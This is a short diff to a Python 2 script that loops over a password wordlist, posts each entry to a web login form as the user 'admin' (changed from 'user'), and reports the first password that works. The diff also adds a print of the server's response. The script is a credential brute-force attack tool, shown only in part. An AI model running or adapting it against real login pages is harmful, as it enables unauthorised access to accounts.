@@ -22,7 +22,7 @@ for x in file.readlines():
 	x = x.strip()
 	print "Trying " + x
 	data1 = {
-		"username" : "user",
+		"username" : "admin",
 		"password" : "%s" %x,
 		"submit" : "LOGIN"
 	}
@@ -32,4 +32,5 @@ for x in file.readlines():
 		print x + " Success!"
 		break
 	
+	print response
 		
